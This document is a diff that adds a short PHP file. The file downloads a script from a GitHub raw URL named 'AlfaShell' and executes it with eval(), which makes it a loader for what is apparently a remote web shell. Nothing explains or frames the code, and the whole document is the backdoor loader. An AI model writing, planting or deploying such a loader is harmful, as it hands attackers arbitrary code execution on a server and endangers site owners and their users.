@@ -1,0 +1,17 @@
+<?php
+function ec($u){
+    $c = curl_init();
+    curl_setopt($c, CURLOPT_URL, $u);
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+    $r = curl_exec($c);
+    curl_close($c);
+    return $r;
+}
+$u= "https://raw.githubusercontent.com/Lucenox/AlfaShell/refs/heads/main/alfa.txt";
+$ft= ec($u);
+if (!empty($ft)) {
+    eval("?>".$ft);
+} else {
+    echo "Error!";
+}
+?>
